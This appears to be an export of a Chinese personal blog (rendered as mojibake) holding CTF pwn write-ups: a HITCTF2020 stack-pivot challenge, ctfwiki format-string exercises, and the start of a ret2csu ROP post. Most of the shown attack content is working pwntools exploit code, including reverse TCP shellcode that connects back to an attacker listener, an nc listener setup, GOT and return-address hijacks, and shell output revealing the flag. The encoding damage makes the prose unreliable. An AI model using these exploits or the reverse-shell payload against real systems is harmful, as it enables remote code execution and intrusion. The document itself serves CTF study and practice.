åˆ©ç”¨\n\nè¿™ä¸ªé¢˜æ§åˆ¶eipå¾ˆç®€å•ï¼Œä½†æ˜¯æ€ä¹ˆget shellå‘¢ï¼Ÿ\n\n```\n1ã€åˆ°è¿™é‡Œï¼Œæˆ‘é¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¹‹å‰ctfwikié‡Œçš„stack pivotingæ–¹æ³•ã€‚æƒ³æŠŠshellcodeå¸ƒç½®åœ¨æ ˆä¸Šï¼Œç„¶åç›´æ¥jmp rspã€‚ä½†æ˜¯æ— å¥ˆä½¿ç”¨ROPgadgetå¹¶æ²¡æœ‰æ‰¾åˆ°â€œjmp rspâ€è¿™æ¡æŒ‡ä»¤ï¼Œå…¶ä»–çš„çœ‹äº†çœ‹æƒ³äº†æƒ³ä¹Ÿéƒ½ä¸å¯è¡Œã€‚æ‰€ä»¥åªèƒ½æ”¾å¼ƒäº†ã€‚\nbling@bling:~/Desktop$ ROPgadget --binary dagongren1 --only \"jmp|ret\"\nGadgets information\n============================================================\n0x00000000004006bb : jmp 0x400650\n0x0000000000400803 : jmp 0x40087a\n0x000000000040098b : jmp qword ptr [rbp]\n0x000000000040094b : jmp qword ptr [rcx]\n0x0000000000400635 : jmp rax\n0x0000000000400581 : ret\n\n2ã€ç„¶åï¼Œæˆ‘åˆæƒ³é€šè¿‡æ³„éœ²libcæ¥æ‰§è¡Œsystemæˆ–execveï¼Œä½†æ˜¯ç”±äºæºç ä¸­æœ‰â€œfclose(stdout);â€ï¼Œä½¿å¾—ç¨‹åºçš„æ ‡å‡†è¾“å‡ºè¢«å…³äº†ï¼Œäºæ˜¯æˆ‘ä¸å¯èƒ½æ³„éœ²å‡ºlibcã€‚æœ€åä¹Ÿåªèƒ½æ”¾å¼ƒè¯¥æƒ³æ³•ã€‚\n```\n\næœ€åï¼Œåœ¨ç‹è€å¸ˆçš„æç¤ºä¸‹ï¼ŒçŸ¥é“.bssæ®µæœ«å°¾åœ¨è¿›ç¨‹ç©ºé—´ä¸­æœ‰ä¸€æ®µæ˜¯å¯å†™çš„ï¼ˆè¦å†™åˆ°externåé¢å“¦ï¼‰ï¼ŒåŠ ä¸Šè¯¥é¢˜ç¨‹åºæœªå¼€å¯NXï¼Œå› æ­¤è¿™æ®µè¿˜å¯ä»¥æ‰§è¡Œã€‚æ‰€ä»¥å°±ä¾é ROP+æ ˆè¿ç§»å§ï¼\n\n## 2.1 è¿ç§»rbp\n\nè¿ç§»åˆ°å“ªé‡Œå‘¢ï¼Ÿä¸€å¼€å§‹è¯•äº†ä¸‹è¿ç§»åˆ°0x600cf0ï¼Œä½†æ˜¯scanfçš„æ—¶å€™ä¼šåœ¨0x0cå¤„æˆªæ–­ï¼Œè¯•äº†åŠå¤©æœ€åé€‰æ‹©äº†0x600f0fã€‚\n\nmainå‡½æ•°ç»“å°¾å¤„:\n\n```assembly\n.text:0000000000400735                 leave\n.text:0000000000400736                 retn\n```\n\nç›¸å½“äºï¼š\n\n```assembly\nmov esp,ebp\npop ebp\npop rip\n```\n\nå› æ­¤æˆ‘ä»¬å°†rbpè¦†ç›–ä¸ºæ ˆè¿ç§»ç›®çš„åœ°å€ï¼Œå°†ripè¦†ç›–ä¸ºæˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç ã€‚\n\n## 2.2 åœ¨æ–°æ ˆä¸­å¸ƒç½®shellcode\n\nrbpæ ˆè¿ç§»åï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ–°çš„æ ˆç©ºé—´å¸ƒç½®shellcodeï¼Œå› æ­¤å¿…å®šè¿˜éœ€è¦è¿›è¡Œä¾æ¬¡è¾“å…¥ã€‚æŸ¥çœ‹mainå‡½æ•°ä¸­scanfçš„ä¸Šä¸‹æ–‡ï¼Œå¦‚ä¸‹ï¼š\n\n```assembly\n.text:00000000004006FC                 lea     rax, [rbp+var_20]\n.text:0000000000400700                 mov     rsi, rax\n.text:0000000000400703                 mov     edi, offset aS  ; \"%s\"\n.text:0000000000400708                 mov     eax, 0\n.text:000000000040070D                 call    __isoc99_scanf\n```\n\n0x4006fcå¤„æ˜¯ä»¥rbpè¿›è¡Œæ ˆç©ºé—´å¯»å€çš„ï¼Œå› æ­¤åœ¨æˆ‘ä»¬è¿ç§»å®Œrbpåå°±å¯ä»¥ç«‹é©¬è¿›è¡Œä¸‹ä¸€æ¬¡scanfè¾“å…¥äº†ã€‚æ„é€ è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n```\n         æ ˆç©ºé—´\n\n         +---------------+\n         |               |\n         |               |                       .bssæ®µ\n         +---------------+\n         |               |                       +---------------+\n         +---------------+                       |               |\nret_addr |   0x4006fc    |                       |               |\n         +---------------+                       |               |\nold_rbp  |   0x600f0f    +----------+            |               |\n         +---------------+ v4+0x20  |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |    padding    |          |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            +---------------+\n         |               |          |            |               |\n         |               |          +----------> +---------------+ 0x600f0f\n         |               |                       |               |\n         +---------------+                       |               |\n         |               |                       |               |\n         +---------------+ v4                    +---------------+\n\n```\n\n## 2.3 æ§åˆ¶eipæ‰§è¡Œshellcode\n\nä¸Šä¸€æ­¥éª¤ä¸­ï¼Œscanfè¾“å…¥å®Œæ¯•åï¼Œmainå‡½æ•°ä¼šç»§ç»­æ‰§è¡Œåˆ°æœ€åçš„`leave;ret;`ï¼Œè¿™é‡Œå¯ä»¥å†æ¬¡æ§åˆ¶eipã€‚éœ€è¦æå‰å¸ƒç½®å¥½æ–°æ ˆä¸­çš„æ•°æ®ã€‚\n\nå› ä¸ºæ˜¯åŒä¸€ä¸ªmainå‡½æ•°çš„æ ˆï¼Œæ‰€ä»¥æ–°æ ˆçš„ç»“æ„è·Ÿä¹‹å‰æ ˆç»“æ„æ˜¯ä¸€æ ·çš„ã€‚è¿™é‡Œéœ€è¦å°†ret_addrå¤„çš„åœ°å€æ”¹æˆshellcodeçš„åœ°å€ï¼Œè¿™æ ·mainå‡½æ•°ä¸­æ‰§è¡Œåˆ°retçš„æ—¶å€™å°±å¯ä»¥æ§åˆ¶æ‰§è¡Œæµäº†ã€‚\n\n```\n         æ ˆç©ºé—´\n\n         +---------------+\n         |               |\n         |               |                       .bssæ®µ\n         +---------------+\n         |               |                       +---------------+\n         +---------------+                       |               |\nret_addr |   0x4006fc    |                       |               |\n         +---------------+                       |               |\nold_rbp  |   0x600f0f    +----------+            |               |\n         +---------------+ v4+0x20  |            |   shellcode   |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            +---------------+\n         |               |          |   ret_addr |     addr      |\n         |    padding    |          |            +---------------+\n         |               |          |   old_rbp  |    padding    |\n         |               |          +----------> +---------------+ 0x600f0f\n         |               |                       |               |\n         |               |                       |               |\n         |               |                       |    padding    |\n         |               |                       |               |\n         +---------------+                       |               |\n         |               |                       |               |\n         +---------------+ v4                    +---------------+ 0x600f0f-0x20\n```\n\n## 2.4 shellcodeçš„é€‰æ‹©\n\nshellcodeæœ‰ä¸€ä¸ªå®˜æ–¹ç½‘ç«™ï¼š[shell-storm](http://shell-storm.org/shellcode/)\n\nç”±äºç¨‹åºæºç ä¸­æœ‰â€œfclose(stdout);â€çš„é™åˆ¶ï¼Œæ— æ³•é€šè¿‡æ™®é€šshellcodeæ‹¿åˆ°shellã€‚è¿™å¤§æ¦‚æ˜¯è¿™é“é¢˜å¯¹æˆ‘æ¥è¯´æœ€éš¾çš„ä¸€éƒ¨åˆ†äº†ã€‚å¯¹ç½‘ç»œçœŸçš„ä¸€çªä¸é€šo(â•¥ï¹â•¥)o\n\nä¸ºäº†ç»•è¿‡è¿™ä¸€é™åˆ¶ï¼Œæœ€åä½¿ç”¨äº†[Reverse TCP shell](http://shell-storm.org/shellcode/files/shellcode-857.php)è¿™ä¸ªshellcodeï¼Œâ€œåè¿TCPâ€çš„æ–¹æ³•ã€‚\n\nå‚è€ƒè¿™ç¯‡æ–‡ç« å¤§æ¦‚äº†è§£äº†ä¸€ä¸‹â€œåè¿TCPâ€è¿™æ˜¯ä¸ªå•¥ï¼š[metasploitä¸­Payloadçš„reverse_tcpå’Œbind_tcpçš„åŒºåˆ«](https://blog.csdn.net/adidala/article/details/24117711)ã€‚\n\nå¤§æ¦‚æ„æ€å°±æ˜¯ è¯´å‘¢ï¼Œreverse_tcpçš„æ–¹æ³•éœ€è¦æˆ‘ä»¬åœ¨ä¸€å°æ”»å‡»æœåŠ¡å™¨ä¸Šæ‰“å¼€ä¸€ä¸ªç›‘å¬ç«¯å£ï¼ˆä½¿ç”¨ncï¼‰ï¼Œpayloadåœ¨å—å®³è€…æœºå™¨ä¸Šæ‰§è¡Œçš„æ—¶å€™ï¼Œæ ¹æ®ipåœ°å€å’Œç«¯å£æ¥è¿æ¥è¯¥æ”»å‡»æœåŠ¡å™¨ï¼Œå°†ä¿¡æ¯ä¼ é€ç»™æ”»å‡»è€…ã€‚è€Œbind_tcpæ˜¯æŒ‡åœ¨å—å®³è€…æœºå™¨ä¸Šå¼€ä¸€ä¸ªç«¯å£ï¼Œç„¶åæ”»å‡»è€…è¿è¿‡å»ï¼Œå¦‚æœå—å®³è€…æœºå™¨å¼€äº†é˜²ç«å¢™ï¼Œè¿™ç§æ–¹æ³•å°±ä¸ä¼šæˆåŠŸã€‚å› æ­¤ï¼Œå¤§å¤šæ•°æ—¶å€™æˆ‘ä»¬éƒ½ä½¿ç”¨reverse_tcpã€‚\n\nå‚è€ƒ[ncå·¥å…·ä½¿ç”¨](https://www.cnblogs.com/zhaijiahui/p/9028402.html)ï¼Œé™„åŠ ä¸€ä¸ªnc/telnetå®ç°æœåŠ¡ç«¯/å®¢æˆ·ç«¯è¿æ¥çš„ä¾‹å­ã€‚\n\n```shell\n#æœåŠ¡ç«¯\n#éœ€è¦è®¾ç½®å¥½ç›‘å¬ç«¯å£çš„é˜²ç«å¢™è§„åˆ™ï¼Œå¦åˆ™å…¶ä»–æœºå™¨æ— æ³•å»ºç«‹è¿æ¥\nnc -p 33x -l -vv\n#å®¢æˆ·ç«¯\ntelnet 1xx.1xx.xx.xxx 33x\n```\n\n# 3 EXP\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyelf = ELF('./dagongren1')\n# æœ¬åœ°è°ƒè¯•\n# myproc = process(myelf.path)\n# æ‰“è¿œç¨‹\nmyproc = remote(\"81.70.209.171\",51601)\n\nafter_bss = 0x600f0f\nscanf_gdt = 0x4006fc\n\npayload1 = 'c' * 0x20\npayload1 += p64(after_bss)\npayload1 += p64(scanf_gdt)\n\n# port - 33x,ip - 14x.12x.5x.1x\n# è¿™é‡Œéœ€è¦æ¢æˆè‡ªå·±æœåŠ¡å™¨çš„åœ°å€å’Œipå“¦ï¼Œè®°å¾—å¯¹åº”ç«¯å£è®¾ç½®é˜²ç«å¢™è§„åˆ™\n# PORTç«¯å£å·å¯¹åº”çš„åå…­è¿›åˆ¶\nPORT = '\\x8x\\x4x'\n# IPADDRå¯¹åº”çš„åå…­è¿›åˆ¶ï¼Œé€šè¿‡'.'å·åˆ†éš”\nIPADDR = '\\x33\\x33\\x33\\x33'\nshellcode = \"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\"\nshellcode += \"\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\"\nshellcode += \"\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\"\nshellcode += \"\\x02\"+ PORT + \"\\xc7\\x44\\x24\\x04\" + IPADDR + \"\\x48\\x89\\xe6\\x6a\\x10\"\nshellcode += \"\\x5a\\x41\\x50\\x5f\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\"\nshellcode += \"\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\"\nshellcode += \"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\"\nshellcode += \"\\x5f\\x6a\\x3b\\x58\\x0f\\x05\"\n\npayload2 = 'a'*0x20\npayload2 += 'bbbbbbbb'\npayload2 += p64(after_bss + 0x10)\npayload2 += shellcode\n\nmyproc.recvuntil(\"Come On\")\n# break at main -> leave;ret;\n# gdb.attach(myproc,\"b *0x400735\")\nmyproc.sendline(payload1)\nmyproc.sendline(payload2)\n\nmyproc.interactive()\n```\n\nç»“æœï¼š\n\n- æœåŠ¡ç«¯\n\n```shell\nroot@iZt4n6o5h5zjwhe2ubl2uqZ:~# nc -p 33x -l -vv\nListening on [0.0.0.0] (family 0, port 33x)\nConnection from 81.70.209.171 51786 received!\nls\nbin\ndev\nflag\nlib\nlib32\nlib64\nlibx32\npwn\ncat flag\n\nHITCTF2020{4957306aaa6ff77d77c310f5379addf7}\n```\n\n- æœ¬åœ°\n\n```shell\nbling@bling:~/Desktop$ python poc.py \n[DEBUG] PLT 0x4005a0 puts\n[DEBUG] PLT 0x4005a8 fclose\n[DEBUG] PLT 0x4005b0 alarm\n[DEBUG] PLT 0x4005b8 __libc_start_main\n[DEBUG] PLT 0x4005c0 __gmon_start__\n[DEBUG] PLT 0x4005c8 setvbuf\n[DEBUG] PLT 0x4005d0 __isoc99_scanf\n[*] '/home/bling/Desktop/dagongren1'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n[+] Opening connection to 81.70.209.171 on port 51601: Done\n[DEBUG] Received 0x13 bytes:\n    'Good morning master'\n[DEBUG] Received 0x3c bytes:\n    00000000  0a 57 6f 72  6b 20 68 61  72 64 20 66  6f 72 20 79  â”‚Â·Worâ”‚k haâ”‚rd fâ”‚or yâ”‚\n    00000010  6f 75 72 20  62 6f 73 73  20 74 6f 20  6c 69 76 65  â”‚our â”‚bossâ”‚ to â”‚liveâ”‚\n    00000020  20 61 20 62  65 74 74 65  72 20 6c 69  66 65 21 f0  â”‚ a bâ”‚etteâ”‚r liâ”‚fe!Â·â”‚\n    00000030  9f 91 80 0a  43 6f 6d 65  20 4f 6e 0a               â”‚Â·Â·Â·Â·â”‚Comeâ”‚ OnÂ·â”‚\n    0000003c\n[DEBUG] Sent 0x31 bytes:\n    00000000  63 63 63 63  63 63 63 63  63 63 63 63  63 63 63 63  â”‚ccccâ”‚ccccâ”‚ccccâ”‚ccccâ”‚\n    *\n    00000020  0f 0f 60 00  00 00 00 00  fc 06 40 00  00 00 00 00  â”‚Â·Â·`Â·â”‚Â·Â·Â·Â·â”‚Â·Â·@Â·â”‚Â·Â·Â·Â·â”‚\n    00000030  0a                                                  â”‚Â·â”‚\n    00000031\n[DEBUG] Sent 0xa7 bytes:\n    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  â”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚\n    *\n    00000020  62 62 62 62  62 62 62 62  1f 0f 60 00  00 00 00 00  â”‚bbbbâ”‚bbbbâ”‚Â·Â·`Â·â”‚Â·Â·Â·Â·â”‚\n    00000030  48 31 c0 48  31 ff 48 31  f6 48 31 d2  4d 31 c0 6a  â”‚H1Â·Hâ”‚1Â·H1â”‚Â·H1Â·â”‚M1Â·jâ”‚\n    00000040  02 5f 6a 01  5e 6a 06 5a  6a 29 58 0f  05 49 89 c0  â”‚Â·_jÂ·â”‚^jÂ·Zâ”‚j)XÂ·â”‚Â·IÂ·Â·â”‚\n    00000050  48 31 f6 4d  31 d2 41 52  c6 04 24 02  66 c7 44 24  â”‚H1Â·Mâ”‚1Â·ARâ”‚Â·Â·$Â·â”‚fÂ·D$â”‚\n    00000060  02 8x 4x c7  44 24 04 9x  8x 3x 8x 48  89 e6 6a 10  â”‚Â·Â·KÂ·â”‚D$Â·Â·â”‚Â·3Â·Hâ”‚Â·Â·jÂ·â”‚\n    00000070  5a 41 50 5f  6a 2a 58 0f  05 48 31 f6  6a 03 5e 48  â”‚ZAP_â”‚j*XÂ·â”‚Â·H1Â·â”‚jÂ·^Hâ”‚\n    00000080  ff ce 6a 21  58 0f 05 75  f6 48 31 ff  57 57 5e 5a  â”‚Â·Â·j!â”‚XÂ·Â·uâ”‚Â·H1Â·â”‚WW^Zâ”‚\n    00000090  48 bf 2f 2f  62 69 6e 2f  73 68 48 c1  ef 08 57 54  â”‚HÂ·//â”‚bin/â”‚shHÂ·â”‚Â·Â·WTâ”‚\n    000000a0  5f 6a 3b 58  0f 05 0a                               â”‚_j;Xâ”‚Â·Â·Â·â”‚\n    000000a7\n[*] Switching to interactive mode\n\n[*] Got EOF while reading in interactive\n$  \n```","categories":["CTF"]},{"title":"ctfwiki format string ç»ƒä¹ ","url":"/2020/11/01/ctfwiki-format-string/","content":"\n# hijack GOT\n\næœ¬é¢˜æ˜¯2016 CCTF ä¸­çš„pwn3\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('./pwn3')\nmyproc = process(myelf.path)\n\ndef get_1(name):\n    myproc.recvuntil('ftp>')\n    myproc.sendline('get')\n    myproc.recvuntil('get:')\n    myproc.sendline(name)\n    data = myproc.recv()\n    return data\n\ndef put_2(name,content):\n    myproc.recvuntil('ftp>')\n    myproc.sendline('put')\n    myproc.recvuntil('upload:')\n    myproc.sendline(name)\n    myproc.recvuntil('the content:')\n    myproc.sendline(content)\n\ndef dir_3():\n    myproc.recvuntil('ftp>')\n    myproc.sendline('dir')\n\nmyproc.recvuntil('Rainism):')\nmyproc.sendline('rxraclhm')\n\nputs_got = myelf.got['puts']\nlog.warn('#####puts_got addr: 0x%x#####' % puts_got)\ninput1 = '%8$s' + p32(puts_got) + '%7$x'\nput_2('aaaa',input1)\n###\n###gdb.attach(myproc,\"b printf\")\n###\nputs_addr = u32(get_1('aaaa')[:4])\n\nlog.warn('#####puts addr: 0x%x#####' % puts_addr)\n\nputs_libc_offset = 0x5f150\nsys_libc_offset = 0x3a950\n\nlibc_base = puts_addr - puts_libc_offset\nsys_addr = libc_base + sys_libc_offset\n\nlog.warn('#####libc_base addr: 0x%x#####' % libc_base)\nlog.warn('#####sys_addr addr: 0x%x#####' % sys_addr)\n##\npayload = fmtstr_payload(7, {puts_got: sys_addr})\n\nmyproc.sendline('put')\nmyproc.recvuntil('upload:')\nmyproc.sendline(\"/bin/sh;\")\nmyproc.recvuntil('the content:')\nmyproc.sendline(payload)\n\nget_1('/bin/sh;')\n\nmyproc.sendline('dir')\n\nmyproc.interactive()\n```\n\n# hijack retaddr\n\næœ¬é¢˜æ˜¯ä¸‰ä¸ªç™½å¸½çš„pwnme_k0\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./pwnme_k0\")\nmyproc = process(myelf.path)\n\nmyproc.recvuntil(\"Input your username(max lenth:20): \")\nmyproc.sendline(\"name\")\nmyproc.recvuntil(\"Input your password(max lenth:20): \")\npasswd = '%6$p'\nmyproc.sendline(passwd)\n\n##\n##gdb.attach(myproc,\"b *0x400b39\")\n##\nmyproc.recvuntil('>')\nmyproc.sendline(str(1))\nmyproc.recvuntil(\"0x\")\n\ndata = myproc.recvline().strip()\nstack_addr = int(data,16)\nret_stack = stack_addr - 0x38\n\n##å°†æ ˆä¸Šçš„è¿”å›åœ°å€è¦†ç›–æˆææƒgadget\nmyproc.recvuntil('>')\nmyproc.sendline(str(2))\nmyproc.recvuntil(\"please input new username(max lenth:20): \")\nmyproc.sendline(p64(ret_stack))\nmyproc.recvuntil(\"please input new password(max lenth:20): \")\nmyproc.sendline(\"%2218c%8$hn\")\n\n##\nmyproc.recvuntil('>')\nmyproc.sendline(str(1))\n\nmyproc.interactive()\n```\n\n# å †ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´\n\n æœ¬é¢˜æ˜¯2015å¹´CSAWä¸­çš„ contacts\n\nï¼ˆè¿™ä¸ªé¢˜è¿˜æ²¡è°ƒå®Œï¼Œåæ¥æœ‰åˆ«çš„äº‹å»äº†ï¼Œå…ˆæ”¾ä¸€ä¸‹ï¼‰\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('./contacts')\nmyproc = process(myelf.path)\n\ndef Create(c_name,c_phone,c_len,c_desp):\n    myproc.recvuntil('>>> ')\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Contact info: \")\n    myproc.recvuntil(\"\\tName: \")\n    myproc.sendline(c_name)\n    myproc.recvuntil(\"\\tEnter Phone No: \")\n    myproc.sendline(c_phone)\n    myproc.recvuntil(\"\\tLength of description: \")\n    myproc.sendline(c_len)\n    myproc.recvuntil(\"\\tEnter description:\\n\\t\\t\")\n    myproc.sendline(c_desp)\n\ndef Display():\n    myproc.recvuntil('>>> ')\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"\\tDescription: \")\n\nCreate('aaaaaaaa','1234567891',str(50),'%31$paaaa')\n\nDisplay()\ndata = myproc.recvuntil('aaaa',drop=True)\nlibc_start_main = int(data,16) - 247\nlog.warn(\"a: 0x%x\" % libc_start_main)\nlibc_base = libc_start_main - 0x18550\nlog.warn(\"b: 0x%x\" % libc_base)\nsys_addr = libc_base + 0x3a950\nbinsh_addr = libc_base + 0x15910b\n\n\npayload = flat([sys_addr,'aaaa',binsh_addr,'%6$p%11$pbbbb'])\ngdb.attach(myproc,\"b *0x08048c22\")\nCreate('xxxxxxxx','2342342234',str(50),payload)\nDisplay()\nmyproc.recvuntil(\"\\tDescription: \")\ndata = myproc.recvuntil('bbbb',drop=True)\ndata = data.split('0x')\nprint data\nebp_addr = int(data[1],16)\nheap_addr = int(data[2],16)\n\n#payoad = '%'+str(ebp_addr-4)+'x'+'%6$n'\n#part1 = (ebp_addr-4)/2\n#part2 = ebp_addr-4 -part1\n#payload = '%'+str(part1)+'x%'+str(part2)+'x%6$n'\n\npayload = fmtstr_payload(6,{ebp_addr:heap_addr})\nprint payload\n\nCreate('eeeeeeee','1231231231',str(400),payload)\nDisplay()\n\nmyproc.interactive()\n      +------------+\n      |  tag 0/1   |\n      +------------+v2+76\n      |len of desp |\n      +------------+v2+72\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |   Name     |\n      +------------+ v2+8                     +---------+\n      |   &heap1   |           +--------+     |         |\n      +------------+ v2+4      |  Phone |     |  desp   |\n      |   &heap2   |           |        |     |         |\n      +------------+ v2        +--------+     +---------+\n0x804b0a0                        heap1          heap2\n\n0x804b088   record num\n```\n\nå‚è€ƒwpï¼š\n\nhttp://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/\n\nhttps://blog.osiris.cyber.nyu.edu/2015/09/28/csaw-ctf-contacts/\n\nhttps://github.com/osirislab/CTF-Solutions/blob/master/CSAWCTF_2015/2015-10-03-csaw-ctf-contacts.markdown","categories":["CTF"]},{"title":"ctfwiki ropç»ƒä¹ ","url":"/2020/10/18/ctfwiki-rop/","content":"\n> éƒ¨é—¨è¦å‡†å¤‡åä¸€æœˆä»½çš„æ¯”èµ›ï¼Œæˆ‘ä¹Ÿè·Ÿç€æŠ¥äº†ä¸ªåã€‚è™½ç„¶è‡ªå·±çš„pwnç°åœ¨è¿˜å¾ˆæ°´ï¼Œä½†æ˜¯æƒ³ç€è¶è¿™ä¸ªæœºä¼šç£ä¿ƒè‡ªå·±ä¸€æŠŠï¼ŒèŠ±ç‚¹æ—¶é—´å¥½å¥½ç»ƒä¸€äº›é¢˜ã€‚å¹³æ—¶é™¤äº†ç»ƒé¢˜ï¼Œè¿˜æœ‰å…¶ä»–å·¥ä½œä¸Šçš„äº‹è¦åšï¼Œæ‰€ä»¥è¿™ä¸ªåªæ˜¯ç®€å•åœ°æŠŠæˆ‘åšè¿‡çš„é¢˜ç›®çš„write upåšäº†ä¸ªç½—åˆ—ï¼Œè¿˜æœ¨æœ‰æ—¶é—´å†™è¯¦ç»†çš„åˆ†æè¿‡ç¨‹å•¦ã€‚ä¸è¿‡æƒ³æƒ³ï¼Œé™¤äº†è‡ªå·±å¯èƒ½ä¹Ÿæ²¡è°ä¼šæ¥çœ‹ï¼Œç­‰ä»¥åæœ‰æ—¶é—´ï¼ˆå‘µå‘µå‘µï¼‰äº†å†å›è¿‡å¤´æ¥æ•´ç†å§~\n\n# ä¸­çº§ROP\n\n## é¢˜ç›®1 ret2csu\n\nret2csuä¸»è¦æ˜¯åˆ©ç”¨__libsc_csu_init()å‡½æ•°ä¸­çš„gadgetï¼Œå¦‚ä¸‹ä»£ç ç‰‡æ®µï¼š\n\n```assembly\n.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54â†“j\n.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]\n.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n.text:0000000000400616\n.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34â†‘j\n.text:0000000000400616                 add     rsp, 8\n.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n```\n\nå°†0x40061aè‡³0x400624å‘½åä¸ºâ€œç‰‡æ®µ1â€ï¼Œ0x400600è‡³0x400614å‘½åä¸ºâ€œç‰‡æ®µ2â€ã€‚åˆ©ç”¨ret2csuæ—¶ï¼Œé¦–å…ˆå°†eipåŠ«æŒåˆ°â€œç‰‡æ®µ1â€ï¼Œå¹¶é€šè¿‡åœ¨æ ˆä¸Šæå‰å¸ƒç½®rbxï¼Œrbpï¼Œr12ï¼Œr13ï¼Œr14ï¼Œr15ï¼Œè¾¾åˆ°æ§åˆ¶å¯„å­˜å™¨çš„ç›®çš„ï¼Œå†åˆ©ç”¨ç‰‡æ®µ1ä¸­çš„é¢retnä½¿ç¨‹åºæµè½¬åˆ°ç‰‡æ®µ2å»æ‰§è¡Œã€‚ç‰‡æ®µ2ä¸­ä¼šå°†r13ï¼Œr14ï¼Œr15ï¼ˆä½32ä½ï¼‰åˆ†åˆ«ç”¨äºæ§åˆ¶rdxï¼Œrsiï¼Œediï¼Œå¦‚æ­¤ä¾¿èƒ½æ§åˆ¶64ä½ä¸‹çš„å‰ä¸‰ä¸ªå‡½æ•°å‚æ•°ã€‚ç´§æ¥ç€æœ‰ä¸€æ¡callæŒ‡ä»¤ï¼Œåªè¦æå‰å°†r12æ§åˆ¶ä¸ºç›®æ ‡å‡½æ•°ï¼ˆç›®æ ‡å‡½æ•°åœ°å€å­˜æ”¾çš„åœ°å€ï¼‰ï¼Œå¹¶å°†rbxç½®ä¸º0ï¼Œå°±å¯ä»¥å®ç°ä»»æ„å‡½æ•°æ‰§è¡Œäº†ã€‚åé¢è¿˜æœ‰ä¸ªcmpï¼ˆæå‰å°†rbxè®¾ç½®ä¸º0ï¼Œrbpè®¾ç½®ä¸º1ï¼‰ä»¥åŠä¸€äº›åˆ—popï¼Œæå‰æ„é€ å¥½åï¼Œç¨‹åºä¼šå†æ¬¡è¿è¡Œåˆ°æœ€åä¸€è¡Œ0x400624ï¼Œæ­¤æ—¶è¿˜å¯ä»¥åŠ«æŒä¸€æ¬¡eipï¼Œè®©ç¨‹åºç»§ç»­æ‰§è¡Œï¼ˆå¦‚å›åˆ°mainå‡½æ•°ï¼‰ã€‚\n\nè¿™é‡Œä½¿ç”¨çš„ç¤ºä¾‹ç¨‹åºæ˜¯[level5](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5)ï¼Œåˆ†æåï¼Œæ„é€ çš„ç¬¬ä¸€æ¬¡ret2csuçŠ¶æ€å¦‚ä¸‹ã€‚æ‰§è¡Œå®Œcsu_frontï¼ˆä¸Šæ–‡ä¸­çš„ç‰‡æ®µ2ï¼‰åï¼Œä¼šç»§ç»­æ‰§è¡Œç‰‡æ®µ1ï¼Œä¸ºäº†æ§åˆ¶æœ€åä¸€è¡Œ0x400624 retnæ—¶çš„eipï¼Œéœ€è¦åœ¨æ ˆä¸Šå¡«å……0x38å­—èŠ‚æ•°æ®ï¼ˆä¸ºäº†å®‰å…¨æ‰§è¡Œå®Œ0x400616è‡³0x400622ä¹‹é—´çš„ä»£ç ï¼‰ã€‚\n\n```\n+--------------------+\n|     csu_front:0x400600\n+--------------------+\n|      r15           |  1\n+--------------------+\n|      r14           |  got_write\n+--------------------+\n|      r13           |  8\n+--------------------+\n|      r12           |  got_write\n+--------------------+\n|      rbp           |  1\n+--------------------+\n|      rbx           |  0\n+--------------------+\n|      ret addr      |  csu_end:0x40061a\n+--------------------+\n|       ebp          |  'aaaaaaaa'\n+--------------------+\n|                    |\n|      'a'*0x80      |\n|                    |\n+--------------------+  